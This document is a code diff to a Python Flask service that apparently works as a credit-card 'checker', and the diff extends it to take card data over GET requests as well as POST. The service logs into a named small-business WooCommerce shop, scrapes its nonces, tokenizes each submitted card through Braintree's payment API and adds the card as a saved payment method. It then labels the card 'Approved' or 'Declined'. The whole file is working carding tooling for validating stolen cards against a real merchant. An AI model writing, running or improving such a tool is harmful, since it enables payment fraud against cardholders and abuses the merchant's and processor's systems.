@@ -1,3 +1,4 @@
+from flask import Flask, request, jsonify
 import requests
 import re
 import json
@@ -5,7 +6,6 @@ import base64
 import random
 from bs4 import BeautifulSoup
 from requests import Session
-from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
@@ -18,19 +18,25 @@ def home():
     return jsonify({
         'status': 'online',
         'endpoint': '/check',
-        'method': 'POST',
-        'format': '{"cc": "number|month|year|cvv"}'
+        'methods': ['GET', 'POST'],
+        'format_get': '/check?cc=number|month|year|cvv',
+        'format_post': '{"cc": "number|month|year|cvv"}'
     })
 
-@app.route('/check', methods=['POST'])
+@app.route('/check', methods=['GET', 'POST'])
 def check_card():
     try:
-        data = request.json
-        if not data or 'cc' not in data:
-            return jsonify({'error': 'Missing cc parameter'}), 400
+        if request.method == 'GET':
+            cc = request.args.get('cc')
+            if not cc:
+                return jsonify({'error': 'Missing cc parameter'}), 400
+        else:
+            data = request.json
+            if not data or 'cc' not in data:
+                return jsonify({'error': 'Missing cc parameter'}), 400
+            cc = data['cc']
         
-        card = data['cc']
-        cc, mm, yy, cvv = card.split('|')
+        cc, mm, yy, cvv = cc.split('|')
     except ValueError:
         return jsonify({'error': 'Invalid format. Use: number|month|year|cvv'}), 400
     except Exception as e:
@@ -44,30 +50,28 @@ def check_card():
     r = Session()
     
     try:
-        print(f"Card: {cc[:6]}XXXXXX{cc[-4:]}")
-        print(f"Email: {email}")
-        print(f"Name: {first_name} {last_name}\n")
-        
         print("========== CURL 1: Get Login Page ==========")
-        headers = {
+        headers1 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'cache-control': 'max-age=0',
-            'upgrade-insecure-requests': '1',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'referer': 'https://www.midwestspeakerrepair.com/my-account/',
-            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Referer': 'https://www.midwestspeakerrepair.com/my-account/',
+            'Priority': 'u=0, i',
         }
         
-        response1 = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers)
-        print(f"Status: {response1.status_code}\n")
+        response1 = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers1)
+        print(f"Status: {response1.status_code}")
+        print(f"Response Length: {len(response1.text)}\n")
         
         soup = BeautifulSoup(response1.text, 'html.parser')
         login_nonce = None
@@ -77,23 +81,24 @@ def check_card():
         print(f"Login Nonce: {login_nonce}\n")
         
         print("========== CURL 2: Login ==========")
-        login_headers = {
+        headers2 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'upgrade-insecure-requests': '1',
-            'origin': 'https://www.midwestspeakerrepair.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://www.midwestspeakerrepair.com/my-account/',
-            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Origin': 'https://www.midwestspeakerrepair.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': 'https://www.midwestspeakerrepair.com/my-account/',
+            'Priority': 'u=0, i',
         }
         
         login_data = {
@@ -104,28 +109,32 @@ def check_card():
             'login': 'Login'
         }
         
-        response2 = r.post('https://www.midwestspeakerrepair.com/my-account/', data=login_data, headers=login_headers)
-        print(f"Status: {response2.status_code}\n")
+        response2 = r.post('https://www.midwestspeakerrepair.com/my-account/', data=login_data, headers=headers2)
+        print(f"Status: {response2.status_code}")
+        print(f"Final URL: {response2.url}\n")
         
         print("========== CURL 3: Get Add Payment Method Page ==========")
-        payment_headers = {
+        headers3 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'upgrade-insecure-requests': '1',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://www.midwestspeakerrepair.com/my-account/payment-methods/',
-            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': 'https://www.midwestspeakerrepair.com/my-account/payment-methods/',
+            'Priority': 'u=0, i',
         }
         
-        response3 = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', headers=payment_headers)
+        response3 = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', headers=headers3)
         print(f"Status: {response3.status_code}")
+        print(f"Response Length: {len(response3.text)}")
         
         soup2 = BeautifulSoup(response3.text, 'html.parser')
         payment_nonce = None
@@ -146,20 +155,22 @@ def check_card():
         print(f"Client Token Nonce: {client_token_nonce}\n")
         
         print("========== CURL 4: Get Client Token ==========")
-        ajax_headers = {
+        headers4 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
-            'sec-ch-ua-platform': '"Android"',
-            'x-requested-with': 'XMLHttpRequest',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'sec-ch-ua-mobile': '?1',
-            'origin': 'https://www.midwestspeakerrepair.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
-            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=1, i',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://www.midwestspeakerrepair.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
+            'Priority': 'u=1, i',
         }
         
         ajax_data = {
@@ -167,28 +178,31 @@ def check_card():
             'nonce': client_token_nonce
         }
         
-        response4 = r.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php', data=ajax_data, headers=ajax_headers)
+        response4 = r.post('https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php', data=ajax_data, headers=headers4)
         print(f"Status: {response4.status_code}")
+        print(f"Response: {response4.text[:200]}...")
         
         ajax_response = response4.json()
         token_data = json.loads(base64.b64decode(ajax_response['data']).decode('utf-8'))
         auth = token_data.get('authorizationFingerprint')
         braintree_session_id = ''.join(random.choices('abcdef0123456789', k=32))
-        print(f"Auth: {auth[:50]}...\n")
+        print(f"Auth: {auth[:50]}...")
+        print(f"Braintree Session ID: {braintree_session_id}\n")
         
         print("========== CURL 5: Tokenize Card ==========")
-        tokenize_headers = {
+        headers5 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Content-Type': 'application/json',
             'Authorization': f'Bearer {auth}',
             'Braintree-Version': '2018-05-10',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
             'Origin': 'https://assets.braintreegateway.com',
             'Sec-Fetch-Site': 'cross-site',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Dest': 'empty',
             'Referer': 'https://assets.braintreegateway.com/',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'priority': 'u=1, i',
+            'Priority': 'u=1, i',
         }
         
         tokenize_payload = {
@@ -212,10 +226,13 @@ def check_card():
             'operationName': 'TokenizeCreditCard',
         }
         
-        response5 = r.post('https://payments.braintree-api.com/graphql', json=tokenize_payload, headers=tokenize_headers)
+        response5 = r.post('https://payments.braintree-api.com/graphql', json=tokenize_payload, headers=headers5)
         print(f"Status: {response5.status_code}")
+        print(f"Response: {response5.text[:200]}...")
         
         tokenize_result = response5.json()
+        if 'errors' in tokenize_result:
+            return jsonify({'error': f'Tokenization failed: {tokenize_result["errors"]}'}), 400
         payment_token = tokenize_result['data']['tokenizeCreditCard']['token']
         print(f"Payment Token: {payment_token}\n")
         
@@ -223,23 +240,24 @@ def check_card():
         print(f"Correlation ID: {correlation_id}\n")
         
         print("========== CURL 6: Submit Add Payment Method ==========")
-        submit_headers = {
+        headers6 = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'Cache-Control': 'max-age=0',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'upgrade-insecure-requests': '1',
-            'origin': 'https://www.midwestspeakerrepair.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
-            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'priority': 'u=0, i',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Ch-Ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Origin': 'https://www.midwestspeakerrepair.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
+            'Priority': 'u=0, i',
         }
         
         submit_data = {
@@ -252,6 +270,7 @@ def check_card():
             'wc_braintree_device_data': f'{{"correlation_id":"{correlation_id}"}}',
             'wc-braintree-credit-card-tokenize-payment-method': 'true',
             'wc_braintree_paypal_payment_nonce': '',
+            'wc_braintree_device_data': f'{{"correlation_id":"{correlation_id}"}}',
             'wc-braintree-paypal-context': 'shortcode',
             'wc_braintree_paypal_amount': '13.00',
             'wc_braintree_paypal_currency': 'USD',
@@ -262,9 +281,10 @@ def check_card():
             'woocommerce_add_payment_method': '1'
         }
         
-        response6 = r.post('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', data=submit_data, headers=submit_headers)
+        response6 = r.post('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', data=submit_data, headers=headers6)
         print(f"Status: {response6.status_code}")
-        print(f"Final URL: {response6.url}\n")
+        print(f"Final URL: {response6.url}")
+        print(f"Response Length: {len(response6.text)}\n")
         
         soup3 = BeautifulSoup(response6.text, 'html.parser')
         error_message = None
@@ -281,7 +301,7 @@ def check_card():
             success_message = success_element.text.strip()
             print(f"Success Message: {success_message}")
         
-        if re.search(r'Avs|avs|Nice', response6.text):
+        if re.search(r'Avs|avs|Nice|Added|Successfully', response6.text):
             result = "Approved-1000 ✅"
         elif error_message and 'Status code' in error_message:
             result = f"Declined: {error_message}"
@@ -289,6 +309,9 @@ def check_card():
             result = f"Declined: {error_message}"
         else:
             result = "Approved-1000 ✅"
+        
+        print(f"\n========== FINAL RESULT ==========")
+        print(result)
         
         return jsonify({
             'result': result,
@@ -299,6 +322,7 @@ def check_card():
         }), 200
         
     except Exception as e:
+        print(f"Error: {str(e)}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/health', methods=['GET'])
